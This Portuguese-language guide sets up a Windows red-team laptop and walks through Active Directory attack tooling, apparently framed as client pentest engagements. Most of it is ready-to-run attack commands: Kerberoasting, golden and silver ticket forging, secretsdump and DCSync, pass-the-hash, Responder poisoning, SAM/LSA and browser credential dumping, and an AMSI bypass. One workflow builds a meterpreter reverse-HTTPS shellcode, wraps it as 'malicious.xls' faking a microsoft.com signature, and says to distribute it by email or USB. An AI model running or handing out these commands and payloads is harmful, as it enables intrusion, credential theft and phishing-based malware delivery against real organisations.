# 🎯 NOTEBOOK 2 - Guia Completo de Uso

## 📋 Visão Geral

O **Notebook 2** é sua **Arma Windows** especializada em:
- **Ataques Active Directory** (BloodHound, SharpHound, PowerView)
- **Pós-Exploração** (Rubeus, Seatbelt, WinPEAS, Certify)
- **Lateral Movement** (Evil-WinRM, Impacket, CrackMapExec via WSL2)
- **Payloads Office/HTA/MSI** (Donut, ScareCrow, Nimcrypt2)
- **Simulação de Insider Attacks** (comportamento realista de funcionário malicioso)

### 🖥️ Hardware
- **CPU**: Intel i5-3210M (2 cores, 4 threads)
- **RAM**: 12GB DDR3
- **OS**: Windows 10/11 Pro
- **Integração**: WSL2 + Kali Linux

---

## 🚀 Instalação Inicial

### **Passo 1: Executar Setup Automático**

```cmd
# Execute como Administrador
cd C:\Users\Ziger\Documents\Scripts\Windows
.\setup-notebook2.bat
```

**OU** via PowerShell:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
cd C:\Users\Ziger\Documents\Scripts\Windows
.\setup-notebook2.ps1
```

### **Passo 2: Reiniciar o Sistema**

Após a instalação, **REINICIE** o computador para habilitar WSL2.

### **Passo 3: Instalar Kali Linux no WSL2**

```powershell
# Instalar Kali Linux
wsl --install -d kali-linux

# Aguardar instalação e configurar usuário/senha
```

### **Passo 4: Configurar Kali Linux**

```bash
# Entrar no WSL2
wsl -d kali-linux

# Atualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar ferramentas essenciais
sudo apt install -y \
    bloodhound \
    python3-impacket \
    crackmapexec \
    smbmap \
    enum4linux-ng \
    kerbrute \
    responder \
    neo4j

# Configurar Neo4j para BloodHound
sudo systemctl enable neo4j
sudo systemctl start neo4j
```

### **Passo 5: Compilar Ferramentas .NET (Opcional)**

Muitas ferramentas precisam ser compiladas. Instale Visual Studio Community:

```powershell
choco install -y visualstudio2022community
choco install -y visualstudio2022-workload-manageddesktop
```

Depois, compile as ferramentas:
- Abra `.sln` no Visual Studio
- Build > Build Solution
- Binários ficam em `bin\Release\`

---

## 📂 Estrutura de Diretórios

```
C:\Tools\
├── AD\                      # Active Directory Tools
│   ├── Bloodhound\          # GUI de análise AD
│   ├── SharpHound\          # Coletor de dados AD
│   ├── PowerView\           # Enumeração AD via PowerShell
│   ├── PowerUp\             # Privilege escalation
│   └── Certify\             # AD Certificate Services
│
├── PostEx\                  # Post-Exploitation
│   ├── Rubeus\              # Kerberos attacks
│   ├── Seatbelt\            # System enumeration
│   ├── WinPEAS\             # PE automation
│   ├── SharpUp\             # PE checker (C#)
│   ├── SharpMapExec\        # Lateral movement (C#)
│   ├── Certify\             # AD CS exploitation
│   └── SharpDPAPI\          # DPAPI credential extractor
│
├── Payloads\                # Payloads & Evasion
│   ├── Office\              # Payloads Office
│   ├── HTA\                 # HTML Applications
│   ├── MSI\                 # Instaladores maliciosos
│   ├── Donut\               # Shellcode generator
│   ├── ScareCrow\           # Payload obfuscation
│   └── Nimcrypt2\           # .NET crypter
│
├── Tools\                   # Networking & Lateral Movement
│   ├── Impacket\            # Suite Python (SMB/LDAP/Kerberos)
│   ├── Responder\           # LLMNR/NBT-NS poisoning
│   └── Mimikatz\            # Credential extraction (baixar manualmente)
│
├── Loot\                    # Credenciais e dados coletados
│   ├── Credentials\
│   ├── Hashes\
│   └── Tickets\
│
└── Engagements\             # Projetos por cliente
    └── ClienteX\
        ├── recon\
        ├── loot\
        └── payloads\
```

---

## 🛠️ Ferramentas Detalhadas

### 🔷 **ACTIVE DIRECTORY TOOLS**

#### **1. BloodHound**

**O que é:** Ferramenta gráfica que usa teoria de grafos para mapear relações no Active Directory e identificar caminhos de ataque.

**Para que serve:**
- Visualizar relações entre usuários, grupos, computadores e GPOs
- Identificar caminhos de privilégio (de usuário comum até Domain Admin)
- Encontrar vulnerabilidades de configuração (ACLs fracas, grupos privilegiados, etc.)

**Como usar:**

```powershell
# 1. Iniciar BloodHound GUI
cd C:\Tools\AD\Bloodhound
.\BloodHound.exe

# 2. Conectar ao Neo4j (padrão: bolt://localhost:7687)
# Usuário: neo4j
# Senha: neo4j (ou a que você configurou)

# 3. Importar dados coletados pelo SharpHound
# Arraste o arquivo ZIP gerado pelo SharpHound para a interface
```

**Workflow completo:**

```powershell
# Passo 1: Coletar dados AD com SharpHound
cd C:\Tools\AD\SharpHound
.\SharpHound.exe -c All -d corp.local

# Passo 2: Abrir BloodHound
cd C:\Tools\AD\Bloodhound
.\BloodHound.exe

# Passo 3: Importar o ZIP gerado
# No BloodHound: Upload Data > Selecionar arquivo ZIP

# Passo 4: Analisar caminhos de ataque
# No BloodHound: Queries > Find Shortest Paths to Domain Admins
```

**Queries úteis no BloodHound:**
- `Find Shortest Paths to Domain Admins` - Caminhos para DA
- `Find Principals with DCSync Rights` - Usuários que podem sincronizar DC
- `Find Kerberoastable Users` - Usuários vulneráveis a Kerberoasting
- `Find AS-REP Roastable Users` - Usuários sem pré-autenticação Kerberos

---

#### **2. SharpHound**

**O que é:** Coletor de dados (ingestor) para BloodHound. Faz enumeração massiva do AD e exporta para JSON.

**Para que serve:**
- Coletar dados de usuários, grupos, computadores, GPOs, ACLs
- Mapear sessões ativas, shares, permissões
- Gerar dados para análise no BloodHound

**Como usar:**

```powershell
cd C:\Tools\AD\SharpHound

# Coleta completa (recomendado)
.\SharpHound.exe -c All -d corp.local

# Coleta específica
.\SharpHound.exe -c Users,Computers,Groups -d corp.local

# Coleta com output customizado
.\SharpHound.exe -c All -d corp.local -o C:\Tools\Loot\bloodhound_data

# Coleta silenciosa (stealth)
.\SharpHound.exe -c All -d corp.local --Stealth

# Coleta via LDAP (sem SMB)
.\SharpHound.exe -c All -d corp.local --LdapOnly
```

**Parâmetros importantes:**
- `-c All` - Coleta tudo (Users, Groups, Computers, GPOs, etc.)
- `-d DOMAIN` - Especifica o domínio
- `-o PATH` - Diretório de output
- `--Stealth` - Modo stealth (evita detecção)
- `--LdapOnly` - Usa apenas LDAP (sem SMB)
- `--CollectionMethod` - Método específico (Default, DCOnly, LoggedOn, etc.)

**Output:**
- Gera arquivo ZIP com JSONs
- Importar no BloodHound arrastando o ZIP

---

#### **3. PowerView**

**O que é:** Suite PowerShell para enumeração e exploitation de Active Directory.

**Para que serve:**
- Enumerar usuários, grupos, computadores, shares
- Encontrar usuários privilegiados, GPOs mal configuradas
- Descobrir relações e permissões no AD
- Identificar alvos para ataques

**Como usar:**

```powershell
# Importar módulo
cd C:\Tools\AD\PowerView
Import-Module .\PowerView.ps1

# Enumeração básica
Get-NetDomain                    # Informações do domínio
Get-NetDomainController          # Listar DCs
Get-NetUser                      # Listar todos os usuários
Get-NetGroup                     # Listar grupos
Get-NetComputer                  # Listar computadores

# Encontrar usuários privilegiados
Get-NetUser -SPN                 # Usuários com SPN (Kerberoasting)
Get-NetUser -PreauthNotRequired  # Usuários sem pré-auth (AS-REP Roasting)
Get-NetUser -TrustedToAuth       # Usuários confiáveis para autenticação

# Encontrar shares acessíveis
Find-DomainShare -CheckShareAccess  # Shares acessíveis
Get-NetShare -ComputerName DC01     # Shares de um computador

# Encontrar GPOs
Get-NetGPO                        # Todas as GPOs
Get-NetGPO -ComputerName PC01     # GPOs aplicadas a um computador

# Encontrar usuários com sessões locais
Get-NetSession -ComputerName DC01  # Sessões ativas

# Encontrar usuários com direitos especiais
Find-LocalAdminAccess            # Computadores onde você tem admin local
Get-NetLocalGroup -ComputerName PC01  # Grupos locais
```

**Exemplos práticos:**

```powershell
# Encontrar todos os usuários com SPN (vulneráveis a Kerberoasting)
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

# Encontrar computadores com SMB anônimo habilitado
Get-NetComputer | ForEach-Object { 
    $shares = Get-NetShare -ComputerName $_.name -ErrorAction SilentlyContinue
    if ($shares) { Write-Host $_.name }
}

# Encontrar usuários que nunca expiram senha (possíveis contas de serviço)
Get-NetUser | Where-Object { $_.passwordneverexpires -eq $true }
```

---

#### **4. PowerUp**

**O que é:** Módulo PowerShell para encontrar vulnerabilidades de privilege escalation no Windows.

**Para que serve:**
- Encontrar serviços com permissões fracas
- Identificar binários modificáveis
- Descobrir tarefas agendadas vulneráveis
- Encontrar configurações inseguras (AlwaysInstallElevated, etc.)

**Como usar:**

```powershell
# Importar módulo
cd C:\Tools\AD\PowerUp
Import-Module .\PowerUp.ps1

# Executar todas as verificações
Invoke-AllChecks

# Verificações específicas
Get-ServiceUnquoted              # Serviços com caminhos não entre aspas
Get-ServiceFilePermission        # Serviços com binários modificáveis
Get-ServicePermission            # Serviços com permissões fracas
Get-ModifiableServiceFile        # Arquivos de serviço modificáveis
Get-ModifiablePath               # Caminhos modificáveis
Get-ScheduledTaskPermission      # Tarefas agendadas vulneráveis
Get-UnquotedService              # Serviços sem aspas no caminho
Get-RegistryAlwaysInstallElevated  # AlwaysInstallElevated habilitado
```

**Exemplo de output:**

```powershell
# Executar verificação completa
Invoke-AllChecks

# Output mostra:
# - Serviços vulneráveis
# - Binários modificáveis
# - Tarefas agendadas
# - Configurações inseguras
```

---

#### **5. Certify**

**O que é:** Ferramenta para explorar AD Certificate Services (ADCS) mal configurados.

**Para que serve:**
- Encontrar templates de certificado vulneráveis
- Identificar certificados que permitem privilege escalation
- Explorar vulnerabilidades de ADCS (ESC1, ESC2, ESC3, etc.)

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\PostEx\Certify
# Abrir Certify.sln no Visual Studio e compilar

# Encontrar templates vulneráveis
.\Certify.exe find /vulnerable

# Listar todos os templates
.\Certify.exe find

# Enumerar certificados
.\Certify.exe find /user:username

# Request de certificado (se vulnerável)
.\Certify.exe request /ca:CA01\corp-CA01-CA /template:VulnerableTemplate /altname:Administrator
```

**Cenários de ataque:**

```powershell
# 1. Encontrar templates vulneráveis
.\Certify.exe find /vulnerable

# 2. Se encontrar template com "Enrollment Rights" para "Authenticated Users"
# 3. Solicitar certificado para usuário privilegiado
.\Certify.exe request /ca:DC01\corp-DC01-CA /template:VulnerableTemplate /altname:Administrator

# 4. Usar certificado para autenticação
# (requer Rubeus ou outras ferramentas)
```

---

### 🔷 **POST-EXPLOITATION TOOLS**

#### **6. Rubeus**

**O que é:** Toolkit completo para ataques Kerberos em C#.

**Para que serve:**
- Kerberoasting (extrair hashes de TGS)
- AS-REP Roasting (extrair hashes de usuários sem pré-auth)
- Pass-the-Ticket (usar tickets Kerberos)
- Golden/Silver Ticket creation
- S4U attacks (impersonation)

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\PostEx\Rubeus
# Abrir Rubeus.sln e compilar
# Binário em: bin\Release\Rubeus.exe

# Kerberoasting (extrair hashes de contas com SPN)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# AS-REP Roasting (usuários sem pré-auth)
.\Rubeus.exe asreproast /outfile:asrep.txt

# Pass-the-Ticket (usar ticket existente)
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Golden Ticket (criar ticket de Domain Admin)
.\Rubeus.exe golden /aes256:hash /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt

# Silver Ticket (criar ticket para serviço específico)
.\Rubeus.exe silver /aes256:hash /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:DC01 /service:cifs /ptt

# S4U (impersonation)
.\Rubeus.exe s4u /user:serviceaccount /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.local /ptt
```

**Workflow de Kerberoasting:**

```powershell
# 1. Enumerar usuários com SPN (PowerView)
Import-Module C:\Tools\AD\PowerView\PowerView.ps1
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

# 2. Kerberoasting com Rubeus
cd C:\Tools\PostEx\Rubeus\Rubeus\bin\Release
.\Rubeus.exe kerberoast /outfile:C:\Tools\Loot\Hashes\kerberoast.txt

# 3. Quebrar hashes offline (John the Ripper ou Hashcat)
# john --wordlist=rockyou.txt kerberoast.txt
# hashcat -m 13100 kerberoast.txt rockyou.txt
```

---

#### **7. Seatbelt**

**O que é:** Ferramenta de enumeração de segurança do Windows em C#.

**Para que serve:**
- Enumerar configurações de segurança (antivirus, AppLocker, LAPS, etc.)
- Verificar autologon, credenciais salvas, processos
- Identificar configurações que podem ser exploradas

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\PostEx\Seatbelt
# Abrir Seatbelt.sln e compilar

# Executar todas as verificações
.\Seatbelt.exe -group=all

# Verificações específicas
.\Seatbelt.exe -group=system      # Informações do sistema
.\Seatbelt.exe -group=user        # Informações do usuário
.\Seatbelt.exe -group=process     # Processos em execução
.\Seatbelt.exe -group=services     # Serviços
.\Seatbelt.exe -group=network     # Configurações de rede
.\Seatbelt.exe -group=defense      # Defesas (AV, AppLocker, etc.)
.\Seatbelt.exe -group=credentials  # Credenciais salvas
.\Seatbelt.exe -group=chromium    # Credenciais do Chrome/Edge
.\Seatbelt.exe -group=slack        # Credenciais do Slack
.\Seatbelt.exe -group=rdp          # Configurações RDP
.\Seatbelt.exe -group=putty        # Credenciais do PuTTY
```

**Output útil:**

```powershell
# Verificar se LAPS está configurado
.\Seatbelt.exe -group=system | Select-String "LAPS"

# Verificar AppLocker
.\Seatbelt.exe -group=defense | Select-String "AppLocker"

# Verificar credenciais salvas
.\Seatbelt.exe -group=credentials

# Verificar autologon
.\Seatbelt.exe -group=system | Select-String "Autologon"
```

---

#### **8. WinPEAS**

**O que é:** Script automatizado que procura vulnerabilidades de privilege escalation.

**Para que serve:**
- Encontrar caminhos de serviço não entre aspas
- Identificar permissões fracas em arquivos/serviços
- Verificar tarefas agendadas vulneráveis
- Encontrar credenciais em arquivos de configuração

**Como usar:**

```powershell
cd C:\Tools\PostEx\WinPEAS

# Executar todas as verificações
.\winPEASx64.exe

# Verificações específicas
.\winPEASx64.exe systeminfo        # Informações do sistema
.\winPEASx64.exe services          # Serviços
.\winPEASx64.exe processes         # Processos
.\winPEASx64.exe filesinfo         # Arquivos interessantes
.\winPEASx64.exe credentials       # Credenciais
.\winPEASx64.exe network           # Rede
.\winPEASx64.exe windowscreds       # Credenciais Windows
.\winPEASx64.exe browser           # Navegadores
.\winPEASx64.exe files             # Arquivos com credenciais

# Modo quiet (apenas vulnerabilidades)
.\winPEASx64.exe quiet

# Output em arquivo
.\winPEASx64.exe > C:\Tools\Loot\winpeas_output.txt
```

**O que procurar no output:**

- **Unquoted Service Paths** - Serviços com caminhos não entre aspas
- **Weak Permissions** - Permissões fracas em arquivos/serviços
- **Scheduled Tasks** - Tarefas agendadas vulneráveis
- **AlwaysInstallElevated** - Instalação elevada habilitada
- **Stored Credentials** - Credenciais salvas no sistema
- **Registry Keys** - Chaves de registro com permissões fracas

---

#### **9. SharpUp**

**O que é:** Similar ao WinPEAS, mas focado em C# e mais rápido.

**Para que serve:**
- Verificar AlwaysInstallElevated
- Encontrar serviços vulneráveis
- Identificar DLL hijacking
- Verificar binários modificáveis

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\PostEx\SharpUp
# Abrir SharpUp.sln e compilar

# Executar todas as verificações
.\SharpUp.exe audit

# Verificações específicas
.\SharpUp.exe audit -m AlwaysInstallElevated
.\SharpUp.exe audit -m ModifiableServices
.\SharpUp.exe audit -m ModifiableBinaries
```

---

#### **10. SharpMapExec**

**O que é:** Versão C# do CrackMapExec para lateral movement.

**Para que serve:**
- Execução remota via WMI/SMB
- Pass-the-Hash
- Enumeração de shares
- Execução de comandos em múltiplos hosts

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\PostEx\SharpMapExec
# Abrir SharpMapExec.sln e compilar

# Executar comando remoto
.\SharpMapExec.exe -u user -p pass -d domain -x "whoami" 192.168.1.0/24

# Pass-the-Hash
.\SharpMapExec.exe -u user -H ntlmhash -d domain -x "whoami" 192.168.1.0/24

# Listar shares
.\SharpMapExec.exe -u user -p pass -d domain --shares 192.168.1.0/24

# Executar PowerShell
.\SharpMapExec.exe -u user -p pass -d domain -X "powershell -enc <base64>" 192.168.1.0/24
```

---

#### **11. SharpDPAPI**

**O que é:** Extrai credenciais armazenadas via DPAPI (Data Protection API).

**Para que serve:**
- Extrair credenciais do Chrome/Edge
- Extrair credenciais do RDP
- Extrair credenciais de redes Wi-Fi
- Extrair credenciais de aplicativos que usam DPAPI

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\PostEx\SharpDPAPI
# Abrir SharpDPAPI.sln e compilar

# Extrair todas as credenciais
.\SharpDPAPI.exe

# Extrair credenciais do Chrome
.\SharpDPAPI.exe chrome

# Extrair credenciais do RDP
.\SharpDPAPI.exe rdp

# Extrair credenciais de Wi-Fi
.\SharpDPAPI.exe wifi
```

**Nota:** Requer privilégios do usuário alvo. Se você tem acesso como outro usuário, precisa do master key dele.

---

### 🔷 **PAYLOADS & EVASION**

#### **12. Donut**

**O que é:** Converte .NET assemblies (EXE/DLL) em shellcode position-independent.

**Para que serve:**
- Converter ferramentas C# (Rubeus, Seatbelt) em shellcode
- Injetar em processos via process injection
- Evitar detecção de executáveis .NET

**Como usar:**

```powershell
# Compilar primeiro (Visual Studio)
cd C:\Tools\Payloads\Donut
# Abrir donut.sln e compilar

# Converter EXE para shellcode
.\donut.exe -f C:\Tools\PostEx\Rubeus\Rubeus.exe -o rubeus.bin

# Converter com parâmetros
.\donut.exe -f C:\Tools\PostEx\Seatbelt\Seatbelt.exe -a 2 -o seatbelt.bin

# Converter DLL
.\donut.exe -f C:\Tools\payload.dll -o payload.bin

# Parâmetros úteis:
# -f FILE      Arquivo para converter
# -o OUTPUT    Arquivo de saída
# -a ARCH      Arquitetura (1=x86, 2=x64)
# -c CLASS     Classe (para DLLs)
# -m METHOD    Método (para DLLs)
```

**Workflow:**

```powershell
# 1. Converter Rubeus para shellcode
cd C:\Tools\Payloads\Donut
.\donut.exe -f C:\Tools\PostEx\Rubeus\Rubeus.exe -o rubeus.bin

# 2. Injetar shellcode em processo (usar outra ferramenta)
# Exemplo com Cobalt Strike, Metasploit, ou ferramenta custom
```

---

#### **13. ScareCrow**

**O que é:** Gerador de payloads ofuscados com evasão de EDR.

**Para que serve:**
- Criar payloads Office (Excel, Word, PowerPoint)
- Criar payloads HTA (HTML Applications)
- Criar payloads MSI (instaladores)
- Bypass de EDR usando técnicas avançadas

**Como usar:**

```bash
# Requer Go instalado
cd C:\Tools\Payloads\ScareCrow

# Criar payload Office (Excel)
.\ScareCrow.exe -I shellcode.bin -Loader excel -domain microsoft.com

# Criar payload HTA
.\ScareCrow.exe -I shellcode.bin -Loader hta -domain contoso.com

# Criar payload MSI
.\ScareCrow.exe -I shellcode.bin -Loader msi -domain trusted.com

# Criar payload DLL
.\ScareCrow.exe -I shellcode.bin -Loader dll -domain corp.local

# Parâmetros:
# -I INPUT     Arquivo shellcode de entrada
# -Loader      Tipo de loader (excel, word, hta, msi, dll)
# -domain      Domínio para assinatura (bypass)
```

**Workflow completo:**

```powershell
# 1. Gerar shellcode (Metasploit ou outra ferramenta)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.5 LPORT=443 -f raw -o shellcode.bin

# 2. Criar payload Office com ScareCrow
cd C:\Tools\Payloads\ScareCrow
.\ScareCrow.exe -I shellcode.bin -Loader excel -domain microsoft.com -o malicious.xls

# 3. Distribuir payload
# Enviar por email, USB, etc.
```

---

#### **14. Nimcrypt2**

**O que é:** Encripta executáveis .NET usando AES e cria loader em Nim.

**Para que serve:**
- Ofuscar executáveis .NET
- Bypass de assinaturas estáticas de AV
- Criar loaders menos detectados

**Como usar:**

```bash
# Requer Python e Nim instalados
cd C:\Tools\Payloads\Nimcrypt2

# Encriptar executável
python nimcrypt.py -f C:\Tools\PostEx\Rubeus\Rubeus.exe -o rubeus_encrypted.exe

# Com parâmetros adicionais
python nimcrypt.py -f payload.exe -o encrypted.exe --process hollowing
```

---

### 🔷 **NETWORKING & LATERAL MOVEMENT**

#### **15. Impacket**

**O que é:** Suite Python que implementa protocolos de rede Windows (SMB, MSRPC, Kerberos, LDAP).

**Para que serve:**
- Execução remota (psexec, smbexec, wmiexec)
- Dump de credenciais (secretsdump)
- Kerberoasting (GetUserSPNs, GetNPUsers)
- NTLM relay attacks (ntlmrelayx)
- Pass-the-Hash

**Como usar:**

```bash
# Instalar Impacket
cd C:\Tools\Tools\Impacket
pip install .

# OU usar via WSL2 (Kali)
wsl -d kali-linux
cd /mnt/c/Tools/Tools/Impacket
pip3 install .
```

**Ferramentas principais:**

```bash
# PSExec (execução remota via SMB)
python psexec.py domain/user:pass@192.168.1.10

# Pass-the-Hash
python psexec.py -hashes :ntlmhash administrator@192.168.1.10

# SMBExec (alternativa mais stealth)
python smbexec.py domain/user:pass@192.168.1.10

# WMIExec (via WMI)
python wmiexec.py domain/user:pass@192.168.1.10

# SecretsDump (dump de hashes)
python secretsdump.py domain/user:pass@192.168.1.10

# Kerberoasting
python GetUserSPNs.py domain/user:pass -dc-ip 192.168.1.10 -request

# AS-REP Roasting
python GetNPUsers.py domain/user:pass -dc-ip 192.168.1.10 -request

# NTLM Relay
python ntlmrelayx.py -tf targets.txt -smb2support

# DCSync (requer privilégios)
python secretsdump.py domain/user:pass@192.168.1.10 -just-dc
```

**Exemplos práticos:**

```bash
# 1. Enumerar shares
python smbclient.py domain/user:pass@192.168.1.10

# 2. Executar comando remoto
python wmiexec.py domain/user:pass@192.168.1.10 "whoami"

# 3. Dump de hashes
python secretsdump.py domain/user:pass@192.168.1.10

# 4. Kerberoasting
python GetUserSPNs.py domain/user:pass -dc-ip 192.168.1.10 -request -outputfile hashes.txt
```

---

#### **16. Evil-WinRM**

**O que é:** Shell interativa via WinRM (Windows Remote Management).

**Para que serve:**
- Acesso remoto via WinRM
- Upload/download de arquivos
- Carregar scripts PowerShell
- Pass-the-Hash

**Como usar:**

```bash
# Instalar (já instalado pelo setup)
gem install evil-winrm

# Conectar com credenciais
evil-winrm -i 192.168.1.10 -u administrator -p password

# Pass-the-Hash
evil-winrm -i 192.168.1.10 -u administrator -H ntlmhash

# Com domínio
evil-winrm -i 192.168.1.10 -u administrator -p password -d domain

# Upload de arquivo
*Evil-WinRM* PS > upload C:\Tools\PostEx\Rubeus\Rubeus.exe

# Download de arquivo
*Evil-WinRM* PS > download C:\Users\admin\Desktop\file.txt

# Carregar script PowerShell
*Evil-WinRM* PS > menu
*Evil-WinRM* PS > Load PowerView.ps1
```

**Comandos úteis no Evil-WinRM:**

```powershell
# Upload
upload <local_path> [remote_path]

# Download
download <remote_path> [local_path]

# Carregar script
load <script.ps1>

# Executar comando
Invoke-Binary <path_to_exe>

# Bypass AMSI
Bypass-4MSI
```

---

#### **17. Responder**

**O que é:** Ferramenta para LLMNR/NBT-NS poisoning e relaying.

**Para que serve:**
- Capturar hashes NTLM via LLMNR/NBT-NS poisoning
- Relaying de autenticação
- Capturar credenciais de usuários

**Como usar:**

```bash
# Via WSL2 (Kali)
wsl -d kali-linux
cd /mnt/c/Tools/Tools/Responder

# Iniciar Responder
python Responder.py -I eth0 -wrf

# Com relaying
python Responder.py -I eth0 -wrf -rdv

# Parâmetros:
# -I INTERFACE    Interface de rede
# -w              Servidor WPAD
# -r              Servidor HTTP
# -f              Servidor FTP
# -rdv            Relaying ativo
```

**Workflow:**

```bash
# 1. Iniciar Responder
python Responder.py -I eth0 -wrf

# 2. Aguardar vítima fazer requisição (digitar nome errado de servidor)

# 3. Capturar hash NTLM

# 4. Quebrar hash offline ou usar para Pass-the-Hash
```

---

#### **18. CrackMapExec (via WSL2)**

**O que é:** Suite completa para testes de penetração em ambientes Windows/AD.

**Para que serve:**
- Enumeração de SMB
- Execução remota
- Pass-the-Hash
- Dump de credenciais
- Enumeração de AD

**Como usar:**

```bash
# Via WSL2 (Kali)
wsl -d kali-linux

# Instalar (se não instalado)
sudo apt install crackmapexec

# Enumeração SMB
crackmapexec smb 192.168.1.0/24

# Com credenciais
crackmapexec smb 192.168.1.0/24 -u user -p pass

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u user -H ntlmhash

# Executar comando
crackmapexec smb 192.168.1.0/24 -u user -p pass -x "whoami"

# Listar shares
crackmapexec smb 192.168.1.0/24 -u user -p pass --shares

# Dump de SAM
crackmapexec smb 192.168.1.0/24 -u user -p pass --sam

# Dump de LSA
crackmapexec smb 192.168.1.0/24 -u user -p pass --lsa

# Enumeração AD
crackmapexec ldap 192.168.1.10 -u user -p pass

# SMB Relay
crackmapexec smb 192.168.1.0/24 -u '' -p '' --smb-relay 192.168.1.20
```

---

## 🎯 Workflows Completos

### **Workflow 1: Internal Pentest - Active Directory**

```powershell
# ============================================================
# FASE 1: RECONNAISSANCE
# ============================================================

# 1. Enumerar domínio com PowerView
cd C:\Tools\AD\PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser | Select-Object samaccountname, description
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

# 2. Coletar dados para BloodHound
cd C:\Tools\AD\SharpHound
.\SharpHound.exe -c All -d corp.local -o C:\Tools\Loot\bloodhound_data

# 3. Abrir BloodHound e importar dados
cd C:\Tools\AD\Bloodhound
.\BloodHound.exe
# Arrastar ZIP gerado pelo SharpHound

# ============================================================
# FASE 2: KERBEROASTING
# ============================================================

# 1. Kerberoasting com Rubeus
cd C:\Tools\PostEx\Rubeus\Rubeus\bin\Release
.\Rubeus.exe kerberoast /outfile:C:\Tools\Loot\Hashes\kerberoast.txt

# 2. Quebrar hashes (via WSL2 ou Kali)
wsl -d kali-linux
hashcat -m 13100 /mnt/c/Tools/Loot/Hashes/kerberoast.txt rockyou.txt

# ============================================================
# FASE 3: LATERAL MOVEMENT
# ============================================================

# 1. Com credenciais obtidas, fazer lateral movement
cd C:\Tools\Tools\Impacket\examples
python psexec.py corp/user:password@192.168.1.50

# 2. Ou usar Evil-WinRM
evil-winrm -i 192.168.1.50 -u user -p password -d corp

# 3. Executar Seatbelt no host comprometido
# (upload via Evil-WinRM)
upload C:\Tools\PostEx\Seatbelt\Seatbelt.exe
Invoke-Binary Seatbelt.exe -group=all
```

---

### **Workflow 2: Criar Payload Office Malicioso**

```powershell
# ============================================================
# FASE 1: GERAR SHELLCODE
# ============================================================

# Via Metasploit (Kali WSL2)
wsl -d kali-linux
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.5 LPORT=443 -f raw -o /mnt/c/Tools/Payloads/shellcode.bin

# ============================================================
# FASE 2: CRIAR PAYLOAD OFFICE
# ============================================================

# Voltar para Windows
cd C:\Tools\Payloads\ScareCrow
.\ScareCrow.exe -I shellcode.bin -Loader excel -domain microsoft.com -o malicious.xls

# ============================================================
# FASE 3: DISTRIBUIR
# ============================================================

# Enviar por email, USB, etc.
# Quando vítima abrir, shellcode será executado
```

---

### **Workflow 3: Lateral Movement com Pass-the-Hash**

```powershell
# ============================================================
# FASE 1: OBTER HASHES
# ============================================================

# Via SecretsDump (Impacket)
cd C:\Tools\Tools\Impacket\examples
python secretsdump.py corp/user:pass@192.168.1.10

# Output: NTLM hashes dos usuários

# ============================================================
# FASE 2: PASS-THE-HASH
# ============================================================

# PSExec com hash
python psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:hash administrator@192.168.1.50

# Evil-WinRM com hash
evil-winrm -i 192.168.1.50 -u administrator -H hash -d corp

# CrackMapExec (via WSL2)
wsl -d kali-linux
crackmapexec smb 192.168.1.0/24 -u administrator -H hash -x "whoami"
```

---

## 🐧 Integração WSL2 + Kali Linux

### **Acessar Arquivos Windows do Kali**

```bash
# Arquivos Windows ficam em /mnt/c/
cd /mnt/c/Tools/AD/SharpHound
./SharpHound.exe -c All
```

### **Usar Ferramentas Kali no Windows**

```powershell
# Executar comando Kali do PowerShell
wsl -d kali-linux crackmapexec smb 192.168.1.0/24

# Executar script Python
wsl -d kali-linux python3 /mnt/c/Tools/Tools/Impacket/examples/psexec.py user:pass@192.168.1.10
```

### **Workflow Híbrido**

```bash
# 1. Enumeração com CrackMapExec (Kali)
wsl -d kali-linux
crackmapexec smb 192.168.1.0/24 -u user -p pass

# 2. Coletar dados AD (Windows)
cd C:\Tools\AD\SharpHound
.\SharpHound.exe -c All

# 3. Analisar no BloodHound (Windows)
C:\Tools\AD\Bloodhound\BloodHound.exe

# 4. Kerberoasting (Windows)
cd C:\Tools\PostEx\Rubeus\Rubeus\bin\Release
.\Rubeus.exe kerberoast

# 5. Quebrar hashes (Kali)
wsl -d kali-linux
hashcat -m 13100 hashes.txt rockyou.txt
```

---

## 📊 Organização de Engagements

### **Estrutura Recomendada**

```powershell
# Criar estrutura para novo cliente
$client = "ClienteX"
New-Item -ItemType Directory -Path "C:\Tools\Engagements\$client" -Force
New-Item -ItemType Directory -Path "C:\Tools\Engagements\$client\recon" -Force
New-Item -ItemType Directory -Path "C:\Tools\Engagements\$client\loot" -Force
New-Item -ItemType Directory -Path "C:\Tools\Engagements\$client\payloads" -Force
New-Item -ItemType Directory -Path "C:\Tools\Engagements\$client\reports" -Force
```

### **Salvar Dados**

```powershell
# BloodHound data
Copy-Item C:\Tools\Loot\bloodhound_data.zip C:\Tools\Engagements\$client\recon\

# Hashes
Copy-Item C:\Tools\Loot\Hashes\*.txt C:\Tools\Engagements\$client\loot\

# Credenciais
Copy-Item C:\Tools\Loot\Credentials\*.txt C:\Tools\Engagements\$client\loot\
```

---

## ⚙️ Configurações e Aliases

### **Aliases PowerShell (Já Configurados)**

```powershell
# Navegação rápida
goto-tools          # cd C:\Tools
goto-ad             # cd C:\Tools\AD
goto-postex         # cd C:\Tools\PostEx
goto-payloads       # cd C:\Tools\Payloads
goto-loot           # cd C:\Tools\Loot
goto-engagements    # cd C:\Tools\Engagements

# Aliases úteis
ll                  # ls
la                  # ls -Force
